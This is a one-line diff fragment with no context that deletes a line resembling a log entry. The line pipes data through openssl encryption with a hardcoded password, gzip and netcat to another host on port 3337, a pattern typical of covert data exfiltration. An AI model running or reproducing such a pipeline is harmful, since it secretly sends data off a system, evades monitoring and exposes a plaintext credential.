@@ -1,1 +1,0 @@
-10.3.2.7 1438373048 reply found | openssl enc -a -A -aes-256-cbc -k SuperSecretPWD | gzip -cf | nc -w 4 -N 10.3.2.8 3337
